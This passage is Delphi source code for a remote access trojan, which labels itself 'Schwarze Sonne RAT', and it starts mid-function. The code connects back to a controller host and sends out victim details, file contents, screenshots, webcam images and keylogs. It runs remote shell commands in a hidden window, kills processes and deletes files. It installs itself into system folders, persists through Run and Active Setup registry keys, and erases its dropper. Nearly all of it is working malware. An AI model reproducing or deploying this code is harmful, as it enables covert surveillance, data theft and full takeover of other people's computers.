   { sleep(1000);
    Repeat
      bytesread := pf.Read(Buf, SizeOf(Buf));
      If (bytesread = 0) Then Break;
      Send(Sock, Buf[0], sizeof(Buf), 0);
      FillChar(Buf, SizeOf(Buf), 0);
      Recv(Sock, Buf, SizeOf(Buf), 0);
    Until BytesRead = 0;
    {$I+}
  until 1 = 3;
End;
Function SendKeylog(P: Pointer): DWord; STDCALL;
Var
  Sock          :TSocket;
  Addr          :TSockAddrIn;
  WSA           :TWSAData;
  BytesRead     :Cardinal;
  Totstring     :string;
  tempStrings   :string;
  Buf           :Array[0..8000] Of Char;
  Name          :String;
  Host          :String;
  Port          :Integer;
  T             :String;
  mutex:integer;
Begin
  Name := GetCurrentDir + '\keylog.dat';
  Host := PInfo(P)^.Host;
  Port := PInfo(P)^.Port;
  mutex := Pinfo(p)^.mutex;
  WSAStartUp($0101, WSA);
    Sock := Socket(AF_INET, SOCK_STREAM, 0);
    Addr.sin_family := AF_INET;
    Addr.sin_port := hTons(port);
    Addr.sin_addr.S_addr := inet_Addr(pchar(Host));
    If (connect(Sock, Addr, SizeOf(Addr)) <> 0) Then Exit;
    T := IntToStr(41) + '|'+inttostr(GetFileSize(GetCurrentDir + '\keylog.dat')) + '|' + IntToStr(mutex) +#10;
    send(sock, t[1],length(T),0);
    {$I-}
    sleep(1000);
    Totstring := Readkeylogger;
    Repeat
      tempStrings := Copy(totstring,1,8000);
      Delete(Totstring,1,8000);
      Send(Sock, tempStrings[1], length(tempStrings), 0);
      If (length(Totstring) = 0) Then Break;
      Recv(Sock, Buf, SizeOf(Buf), 0);
    Until BytesRead = 0;
    {$I+}
End;
Function SendFile(P: Pointer): DWord; STDCALL;
Var
  Sock          :TSocket;
  Addr          :TSockAddrIn;
  WSA           :TWSAData;
  BytesRead     :Cardinal;
  F             :File;
  Buf           :Array[0..8000] Of Char;
  Name          :String;
  Host          :String;
  Port          :Integer;
  FileSize      :cardinal;
  T             :String;
Begin
  Name := PInfo(P)^.Name;
  Host := PInfo(P)^.Host;
  Port := PInfo(P)^.Port;
  FileSize := PInfo(P)^.FileSize;
  WSAStartUp($0101, WSA);
    Sock := Socket(AF_INET, SOCK_STREAM, 0);
    Addr.sin_family := AF_INET;
    Addr.sin_port := hTons(port);
    Addr.sin_addr.S_addr := inet_Addr(pchar(Host));
    If (connect(Sock, Addr, SizeOf(Addr)) <> 0) Then Exit;
    T := IntToStr(C_STARTTRANSFER) + '|'+inttostr(FileSize)+'|' + name+   #10;
    send(sock, t[1],length(T),0);
    {$I-}
    sleep(1000);
    AssignFile(F, Name);
    Reset(F, 1);
    Repeat
      BlockRead(F, Buf, SizeOf(Buf), BytesRead);
      If (BytesRead = 0) Then Break;
      Send(Sock, Buf[0], SizeOf(Buf), 0);
      FillChar(Buf, SizeOf(Buf), 0);
      Recv(Sock, Buf, SizeOf(Buf), 0);
    Until BytesRead = 0;
    CloseFile(F);
    {$I+}
End;

Function ExtractFileName(Const Path: String): String;
Var
  I     :Integer;
  L     :Integer;
  Ch    :Char;
Begin
  Result := Path;
  L := Length(Path);
  For I := L DownTo 1 Do
  Begin
    Ch := Path[I];
    If (Ch = '\') Or (Ch = '/') Then
    Begin
      Result := Copy(Path, I + 1, L - I);
      Break;
    End;
  End;
End;


Function RemoteAddr(Sock: TSocket): TSockAddrIn;
Var
  W     :TWSAData;
  S     :TSockAddrIn;
  I     :Integer;
Begin
  WSAStartUP($0101, W);
  I := SizeOf(S);
  GetPeerName(Sock, S, I);
  WSACleanUP();

  Result := S;
End;

Function RemoteAddress(Sock: TSocket): String;
Begin
  Result := INET_NTOA(RemoteAddr(Sock).sin_addr);
End;

function FindMatchingFile(var F: TSearchRec): Integer;
var
  LocalFileTime: TFileTime;
begin
  with F do
  begin
    while FindData.dwFileAttributes and ExcludeAttr <> 0 do
      if not FindNextFile(FindHandle, FindData) then
      begin
        Result := GetLastError;
        Exit;
      end;
    FileTimeToLocalFileTime(FindData.ftLastWriteTime, LocalFileTime);
    FileTimeToDosDateTime(LocalFileTime, LongRec(Time).Hi, LongRec(Time).Lo);
    Size := FindData.nFileSizeLow;
    Attr := FindData.dwFileAttributes;
    Name := FindData.cFileName;
  end;
  Result := 0;
end;

procedure FindClose(var F: TSearchRec);
begin
  if F.FindHandle <> INVALID_HANDLE_VALUE then
  begin
    Windows.FindClose(F.FindHandle);
    F.FindHandle := INVALID_HANDLE_VALUE;
  end;
end;

function FindFirst(const Path: string; Attr: Integer;
  var  F: TSearchRec): Integer;
const
  faSpecial = faHidden or faSysFile or faVolumeID or faDirectory;
begin
  F.ExcludeAttr := not Attr and faSpecial;
  F.FindHandle := FindFirstFile(PChar(Path), F.FindData);
  if F.FindHandle <> INVALID_HANDLE_VALUE then
  begin
    Result := FindMatchingFile(F);
    if Result <> 0 then FindClose(F);
  end else
    Result := GetLastError;
end;

function FindNext(var F: TSearchRec): Integer;
begin
  if FindNextFile(F.FindHandle, F.FindData) then
    Result := FindMatchingFile(F) else
    Result := GetLastError;
end;

Procedure GenerateList(Dir: String; dNr: Integer);
Var
  SR    :TSearchRec;
  Temp  :String;
  Att   :String;
  sTemp:string;
Begin
  If (Dir = '') Then Exit;
  If (Dir[Length(Dir)] <> '\') Then Dir := Dir + '\';
  If FindFirst(Dir + '*.*', faDirectory or faHidden or faSysFile or faVolumeID or faArchive or faAnyFile, SR) = 0 Then
  Repeat
    if dnr = 2 then begin
    If ((SR.Attr And faDirectory) <> faDirectory) Then Begin
      Att := '';
      If ((SR.Attr and faReadOnly) = faReadOnly) Then Att := Att + 'R/';
      If ((SR.Attr and faHidden) = faHidden) Then Att := Att + 'H/';
      If ((SR.Attr and faSysFile) = faSysFile) Then Att := Att + 'S/';
      If ((SR.Attr and faVolumeID) = faVolumeID) Then Att := Att + 'V/';
      If ((SR.Attr and faArchive) = faArchive) Then Att := Att + 'A/';
      If ((SR.Attr and faAnyFile) = faAnyFile) Then Att := Att + 'An/';

      If Copy(Att, length(Att), 1) = '/' Then
        Delete(Att, Length(Att), 1);
      if sr.name <> '..' then begin
      sTemp := '|'+Att+'#'+IntToStr(SR.Size)+'#'+SR.Name;
      Temp := Temp +  sTemp;
      end;
    end;
    end else begin
      If ((SR.Attr And faDirectory) = faDirectory) Then
      Begin
        sTemp := '|DIR#0#'+SR.Name;
        Temp := Temp +  sTemp;
      End;
    end;
  Until FindNext(SR) <> 0;
  Temp := IntToStr(18)+ Temp + #10;
        Send(Serv.Sock, Temp[1], Length(Temp), 0);
End;






Procedure ListProcess(dInt: Integer);
Var
  pHandle      :THandle;
  hSnapShot     :THandle;
  ProcessEntry  :TProcessEntry32;
  Temp          :String;
  sTemp         :string;
  ppath         :string;
Begin
  hSnapShot := CreateToolHelp32SnapShot(TH32CS_SNAPALL,0);
    ProcessEntry.dwSize := SizeOf(TProcessEntry32);
      try
       Process32First(hSnapShot, ProcessEntry);
        repeat
        phandle := OpenProcess(PROCESS_QUERY_INFORMATION or PROCESS_VM_READ, False, ProcessEntry.th32ProcessID);
        SetLength(ppath, MAX_PATH);
          if (GetModuleFileNameEx(phandle, 0, PChar(ppath), MAX_PATH)) > 0 then begin;
            SetLength(ppath, length(PChar(ppath)));
            end
          else begin
            ppath := 'System';
          end;
          sTemp := '|' + IntToStr(ProcessEntry.th32ProcessID) + '#' + ppath + '#' + ProcessEntry.szExeFile;
          Temp := Temp + sTemp;
    until not Process32Next(hSnapShot, ProcessEntry);
    finally
    CloseHandle(hSnapShot);
 end;
  Temp :=  '16' + Temp + #10;
  Send(Serv.Sock, Temp[1], Length(Temp), 0);
End;

function GetDrivez: string;
var
  r: LongWord;
  Drives: array[0..128] of char;
  pDrive: pchar;
begin
  Result := '';
  r := GetLogicalDriveStrings(sizeof(Drives), Drives);
  if r = 0 then exit;
  pDrive := Drives;  // Point to the first drive
  while pDrive^ <> #0 do begin
    result := result + pdrive + '|';
    inc(pDrive, 4);  // Point to the next drive
  end;
end;

Procedure EndProcess(dPID: String);
Var
  ProcessHandle :THandle;
Begin
  ProcessHandle := OpenProcess(PROCESS_TERMINATE, BOOL(0), StrToInt(dPID));
  TerminateProcess(ProcessHandle, 0);
End;

function AllocMem(Size: Cardinal): Pointer;
begin
  GetMem(Result, Size);
  FillChar(Result^, Size, 0);
end;

function RunDosInCap(DosApp:String):String;
const
  ReadBuffer = 24000;
var
  Security: TSecurityAttributes;
  ReadPipe,WritePipe: THandle;
  start: TStartUpInfo;
  ProcessInfo: TProcessInformation;
  Buffer: Pchar;
  BytesRead, Apprunning: DWord;
begin
  With Security do
  begin
    nlength := SizeOf(TSecurityAttributes);
    binherithandle := true;
    lpsecuritydescriptor := nil;
  end;
  if Createpipe (ReadPipe, WritePipe, @Security, 0) then
  begin
    Buffer  := AllocMem(ReadBuffer + 1);
    FillChar(Start,Sizeof(Start),#0);
    start.cb := SizeOf(start);
    start.hStdOutput := WritePipe;
    start.hStdInput := ReadPipe;
    start.dwFlags := STARTF_USESTDHANDLES + STARTF_USESHOWWINDOW;
    start.wShowWindow := SW_HIDE;
  if CreateProcess(nil,PChar(DosApp),@Security,@Security,true,NORMAL_PRIORITY_CLASS,nil,nil,start,ProcessInfo) then
  begin
    repeat
      Apprunning := WaitForSingleObject (ProcessInfo.hProcess,100);
    until (Apprunning <> WAIT_TIMEOUT);
    Repeat
      BytesRead := 0;
      ReadFile(ReadPipe,Buffer[0],ReadBuffer,BytesRead,nil);
      Buffer[BytesRead]:= #0;
      OemToAnsi(Buffer,Buffer);
      Result := Result + String(Buffer);
    until (BytesRead < ReadBuffer);
  end;
    FreeMem(Buffer);
    CloseHandle(ProcessInfo.hProcess);
    CloseHandle(ProcessInfo.hThread);
    CloseHandle(ReadPipe);
    CloseHandle(WritePipe);
  end;
end;

Procedure ReplaceStr(ReplaceWord, WithWord:String; Var Text: String);
Var
  xPos: Integer;
Begin
  While Pos(ReplaceWord, Text)>0 Do
  Begin
    xPos := Pos(ReplaceWord, Text);
    Delete(Text, xPos, Length(ReplaceWord));
    Insert(WithWord, Text, xPos);
  End;
End;

Procedure TServer.ReceiveData;
Var
  Buffer: Array[0..1600] Of Char;
  Data: String;
  Mutex:integer;
  D: Dword;
  Len: Integer;
  Temp: String;
  Cmd: String;
  Param: Array[0..100]of String;
  FName: String;
Begin
  Repeat
    Len := Recv(Sock, Buffer, 1600, 0);
    If (Len <= 0) Then Break;

    Data := String(Buffer);
    ZeroMemory(@Buffer, SizeOf(Buffer));

    While (Pos(#10, Data) > 0) Do
    Begin
      Temp := Copy(Data, 1, Pos(#10, Data)-1);
      Delete(Data, 1, Pos(#10, Data));

      StripOutCmd(Temp, Cmd);
      StripOutParam(Temp, Param);

      Case StrToInt(Cmd) Of
        C_UNINSTALL     :Uninstall;
        C_PASS          :If (Param[0] = '0') Then CloseSocket(Sock);
        C_GETFILE       :Begin
                           Delete(Temp, 1, 3);
                           If (FileExists(Temp)) Then
                           Begin
                             FName := ExtractFileName(Temp);
                             Mutex := ((Random(9)+1)*1000)+Random(500);
                             //SendData(IntToStr(C_STARTTRANSFER)+' 0 '+IntToStr(GetFileSize(Temp))+' '+IntToStr(Port)+' '+FName+#10);
                             Info.Name := Temp;
                             Info.Host := RemoteAddress(Sock);
                             Info.Port := Port;
                             info.Mutex := Mutex;
                             info.FileSize := getfilesize(Temp);
                             CreateThread(NIL, 0, @SendFile, @Info, 0, D);
                           End;
                         End;
        C_PUTFILE       :Begin
                           OutputDebugString(PChar(Param[0]));
                           OutputDebugString(PChar(Param[1]));
                           OutputDebugString(PChar(Param[2]));
                           OutputDebugString(PChar(Param[3]));
                           Info.Name := Param[1];
                           Info.Host := RemoteAddress(Sock);
                           Info.Port := Port;
                           Info.Size := strtoint(Param[0]);
                           info.sFile := Param[2];
                           CreateThread(NIL, 0, @recvfile, @Info, 0, D);
                         End;
        C_SCREEN:begin
                   info.host := RemoteAddress(Sock);
                   Info.Port := Port;
                   info.Mutex := strtoint(param[0]);
                   info.SShot := (strtoint(param[1]) / 100);
                   CreateThread(NIL, 0, @SendScreenShot, @info, 0, D);
                 end;
        C_SCREENN:begin
                   info.host := RemoteAddress(Sock);
                   Info.Port := Port;
                   info.Mutex := strtoint(param[0]);
                   info.SShot := (strtoint(param[1]) / 100);
                   CreateThread(NIL, 0, @SendScreenShotN, @info, 0, D);
                 end;
        C_INFOSYSTEM    :SendData(GetInformation());
        C_INFOSERVER    :SendData(GetServerInfo());
        C_INFONETWORK   :SendData(GetNetworkInfo());
        C_REQUESTDRIVE  :Begin

                             FName := IntToStr(C_REQUESTDRIVE)+'|'+GetDrivez+#10;
                             //Temp := Copy(Temp, Pos(#0, Temp)+1, Length(Temp));
                             Send(Sock, FName[1], Length(FName), 0);
                             //FName := '';
                         End;
        C_REQUESTLIST   :Begin
                           Temp := Copy(Temp, Pos(Param[0], Temp), Length(Temp));
                           GenerateList(Temp, 1);
                           GenerateList(Temp, 2);
                           LastDir := IntToStr(C_CURRENTPATH) +'|'+Temp;
                           If LastDir <> '' Then
                             If (LastDir[Length(LastDir)] <> '\') Then LastDir := LastDir + '\';
                           LastDir := LastDir + #10;
                         End;
        C_CURRENTPATH   :Send(Sock, LastDir[1], Length(LastDir), 0);
        C_EXECUTE       :Begin
                           Temp := Copy(Temp, Pos(Param[1], Temp), Length(Temp));
                           ShellExecute(0, 'open', pChar(Temp), nil, nil, StrToInt(Param[0]));
                         End;
        C_DELETE        :Begin
                           Temp := Copy(Temp, Pos(Param[0], Temp), Length(Temp));
                           DeleteFile(pChar(Temp));
                         End;
        C_PROCESSLIST   :Begin
                           ListProcess(StrToInt(Param[0]));
                         End;
        C_ENDPROCESS    :begin
                          EndProcess(Param[0]);
                        end;
        C_REMOTECMD     :Begin
                           Temp := IntToStr(C_REMOTECMD) + ' ' +
                                   RunDosInCap(Copy(Temp, 4, Length(Temp)));
                           ReplaceStr(#10, #1, Temp);
                           Temp := Temp + #10;
                           Send(Sock, Temp[1], Length(Temp), 0);
                         End;
        C_WEBCAM:begin
                 info.host := RemoteAddress(Sock);
                 Info.Port := Port;
                 info.Mutex := strtoint(param[0]);
                 info.SShot := (strtoint(param[1]) / 100);
                 info.Size := strtoint(param[2]);
                 CreateThread(NIL, 0, @SendWebcam, @info, 0, D);
                 end;
        C_STARTKEYLOG:begin
            Hookhandle := 1;
        end;
        C_STOPKEYLOG:begin
                      Hookhandle := 0;
                     end;
        C_STOPSERV:begin
                    closesocket(Sock);
                    ExitProcess(0);
                   end;
        C_UNINSTALLSERV:begin
                         Uninstall; 
                        end;
        C_LISTREGKEY: begin
                        ListarClaves(param[0]);
                        sleep(100);
                        ListarValues(param[0]);
                      End;
        C_GETOFFKEYLOG:begin
                          info.host := RemoteAddress(Sock);
                          Info.Port := Port;
                          info.Mutex := strtoint(param[0]);
                          CreateThread(NIL, 0, @Sendkeylog, @info, 0, D);
                       end;
      end;
    End;
  Until 1 = 2;

  CloseSocket(Sock);
End;

//Thx to Jani
Function GetOS: string;
var
  osVerInfo: TOSVersionInfo;
  majorVer, minorVer: Integer;
begin
  Result := 'OsUnknown';
  { set operating system type flag }
  osVerInfo.dwOSVersionInfoSize := SizeOf(TOSVersionInfo);
  if GetVersionEx(osVerInfo) then
  begin
    majorVer := osVerInfo.dwMajorVersion;
    minorVer := osVerInfo.dwMinorVersion;
    case osVerInfo.dwPlatformId of
      VER_PLATFORM_WIN32_NT: {Mirosoft Windows NT/2000 }
        begin
          if majorVer <= 4 then
            Result := 'Windows NT'
          else if (majorVer = 5) and (minorVer = 0) then
            Result := 'Windows 2000'
          else if (majorVer = 5) and (minorVer = 1) then
            Result := 'Windows XP'
          else if (majorVer = 6) and (minorVer = 0) then
            Result := 'Windows Vista'
          else if (majorVer = 6) and (minorVer = 1) then
            Result := 'Windows 7'
          else
            Result := 'OsUnknown';
        end;
      VER_PLATFORM_WIN32_WINDOWS:  { Windows 9x/ME }
        begin
          if (majorVer = 4) and (minorVer = 0) then
            Result := 'Windows 95'
          else if (majorVer = 4) and (minorVer = 10) then
          begin
            if osVerInfo.szCSDVersion[1] = 'A' then
              Result := 'Windows 98SE'
            else
              Result := 'Windows 98';
          end
          else if (majorVer = 4) and (minorVer = 90) then
            Result := 'Windows ME'
          else
            Result := 'Unknown';
        end;
      else
        Result := 'Unknown';
    end;
  end
  else
    Result := 'Unknown';
end;
//thx to mjrod
function GetWindowsLanguage:String;
var
Buffer: PChar;
Size: Integer;
begin
Size := GetLocaleInfo(LOCALE_USER_DEFAULT,LOCALE_SABBREVLANGNAME,nil,0);
GetMem(Buffer,Size);
try
GetLocaleInfo(LOCALE_USER_DEFAULT,LOCALE_SABBREVLANGNAME,Buffer,Size);
Result := String(Buffer);
finally
FreeMem(Buffer);
end;
end;

Procedure TServer.SendData(Text: String);
var
  dErr: Integer;
Begin
  dErr := Send(Sock, Text[1], Length(Text), 0);
  If (dErr = 0) Then Exit;
End;

Procedure TServer.Connect;
Begin
  WSAStartUP($0202, WSA);

  Close := False;
  repeat
    Host := ResolveIP(Host);
    Sock := Socket(AF_INET, SOCK_STREAM, 0);
    Addr.sin_family := AF_INET;
    Addr.sin_port := hTons(Port);
    Addr.sin_addr.S_addr := inet_Addr(pChar(Host));

    If (Winsock.Connect(Sock, Addr, SizeOf(Addr)) = 0) Then
    Begin
      SendData('01|'+password+#10);
      sleep(100);
      SendData('02|'+GetUserFromWindows + '@' +GetComputerNetName + '|' + GetOS + '|' + GetWindowsLanguage +#10);
      ReceiveData;
    End;
    Sleep(3000);
    LastDir := '';

  until (Close);

  WSACleanUP();
End;

Procedure ReadFileStr(dName: String; Var Content: String);
Var
  FContents     : File Of Char;
  FBuffer       : Array [1..1024] Of Char;
  rLen          : LongInt;
  FSize         : LongInt;
Begin
  Try
    Content := '';
    AssignFile(FContents, dName);
    Reset(FContents);
    FSize := FileSize(FContents);

    While Not EOF(FContents) Do
    Begin
      BlockRead(FContents, FBuffer, 1024, rLen);
      Content := Content + String(FBuffer);
    End;
    CloseFile(FContents);

    If Length(Content) > FSize Then
      Content := Copy(Content, 1, FSize);
  Except
    Exit;
  End;
End;

Function EncryptText(Text: String): String;
Var
  I     :Word;
  C     :Word;
Begin
  Result := '';
  For I := 1 To Length(Text) Do
    Begin
      C := Ord(Text[I]);
      Result := Result + Chr((C Xor 12));
    End;
End;



function LocalAppDataPath : string;
const
   SHGFP_TYPE_CURRENT = 0;
var
   path: array [0..MAX_PATH] of char;
begin
   SHGetFolderPath(0,CSIDL_LOCAL_APPDATA,0,SHGFP_TYPE_CURRENT,@path[0]) ;
    Result := path;
    if Result[Length(Result)] <> '\' then
    Result := Result + '\';
end;
function FindWindowsDir: string;
var
  DataSize: byte;
begin
  SetLength(Result, 255);
  DataSize := GetWindowsDirectory(PChar(Result), 255);
  if DataSize <> 0 then
  begin
    SetLength(Result, DataSize);
    if Result[Length(Result)] <> '\' then
      Result := Result + '\';
  end;
end;

function FindSystemDir: string;
var
  DataSize: byte;
begin
  SetLength(Result, 255);
  DataSize := GetSystemDirectory(PChar(Result), 255);
  if DataSize <> 0 then
  begin
    SetLength(Result, DataSize);
    if Result[Length(Result)] <> '\' then
      Result := Result + '\';
  end;
end;

function FindTempDir: string;
var
  DataSize: byte;
begin
  SetLength(Result, MAX_PATH);
  DataSize := GetTempPath(MAX_PATH, PChar(Result));
  if DataSize <> 0 then
  begin
    SetLength(Result, DataSize);
    if Result[Length(Result)] <> '\' then
      Result := Result + '\';
  end;
end;



Procedure Install;
var
  F     :TextFile;
Begin
  
  if sInstallme = true then begin
    if installdir = 'Application Data' then installdir := LocalAppDataPath;
    if installdir = 'Windows' then installdir := FindWindowsDir;
    if installdir = 'System32' then installdir := FindSystemDir;
    if installdir = 'Temp' then installdir := FindTempDir;
    OutputDebugString(PChar(installdir + installFilename));
    if UpperCase(GetCurrentDir + '\') <> UpperCase(installdir) then begin
      CopyFile(pChar(ParamStr(0)), pChar(installdir + installFilename), False);
      Sleep(100);
      ShellExecute(0, 'Open', pchar(installFilename),'', PChar(installdir), 0);
      if sMelt then begin
        AssignFile(F, pChar(installdir + 'melt.bat'));
        ReWrite(F);
        WriteLn(F, 'del "'+ParamStr(0)+'"');
        WriteLn(F, 'del "' + installdir + 'melt.bat"');
        CloseFile(F);
        ShellExecute(0, 'Open', pchar('melt.bat'),'', PChar(installdir), 0);
      End;
      ExitProcess(0);
    end else begin
      if sStartupme = True then begin
        if sActiveX = true then begin
          AniadirClave('HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Active Setup\Installed Components\','', 'clave');//,(HKEY_CURRENT_USER,'Software\Microsoft\Windows\CurrentVersion\Run', HKCUStartup, ParamStr(0));
          AniadirClave('HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Active Setup\Installed Components\' + ActiveXStartup, '', 'clave');
          aniadirclave('HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Active Setup\Installed Components\' + ActiveXStartup + '\StubPath',paramstr(0), 'REG_SZ');
        end;
        if sHCKUStart = true then begin
          AniadirClave('HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\' + HKCUStartup,paramstr(0),'REG_SZ');
        end;
      end;
    end;
  end;
End;
procedure StartME;
begin
  Serv := TServer.Create;
  Serv.Connect;
end;
begin
  OutputDebugString(PChar('Hey dude, I know your job is boring and monotonous.'));
  OutputDebugString(PChar('But now let us speak together!'));
  OutputDebugString(PChar('This is Schwarze Sonne RAT by Slayer616, Bro.'));
  OutputDebugString(PChar('What about a Detectionname like W32/SchwSonne or Troj/SSTrj?'));
  OutputDebugString(PChar('It was hard work to code this dude, so please make me happy by giving me a special Detection Name!'));
  OutputDebugString(PChar('If you want to speak with me: slayer616@scenecoderz.cc'));
  OutputDebugString(PChar('Goodbye Bro and have fun analyzing this!'));
  Sleep(1000);
  if ReadSettings(sSettings) then begin
     SplitSettings(sSettings,sInstallParams);
     host := sinstallparams[0];
     port := strtoint(sinstallparams[1]);
     password := sinstallparams[2];
     installdir := sinstallparams[3];
     installFilename := sinstallparams[4];
     HKCUStartup := sinstallparams[5];
     ActiveXStartup := sinstallparams[6];
     if sinstallparams[7] = '1' then sInstallme := True else sInstallme := False;
     if sInstallParams[8] = '1' then sStartupme := True else sStartupme := False;
     if sInstallParams[9] = '1' then sActiveX := True else sActiveX := False;
     if sInstallParams[10] = '1' then sHCKUStart := True else sHCKUStart := False;
     sHandleMutex := CreateMutex(nil, true, PChar(sInstallParams[11]) );
     if GetLastError = ERROR_ALREADY_EXISTS then begin
        ExitProcess(0);
     end;
     if sInstallParams[12] = '1' then sunhook := true else sunhook := False;
     if sInstallParams[13] = '1' then sMelt := true else sMelt := False;
     if sInstallParams[14] = '1' then sKeylogger := true else sKeylogger := False;
     Install;
  end;
  hookhandle := 0;
  CreateThread(nil,0,@startme,nil,0,sKeyloggerThread);
   if sKeylogger then sKeyloggerThread := SetWindowsHookEx(WH_JOURNALRECORD, @JHProc, hInstance, 0);
   while GetMessage(Msg, 0, 0, 0) do
  begin
    TranslateMessage(Msg);
    DispatchMessage(Msg);
  end;
  Halt(Msg.wParam);
end.
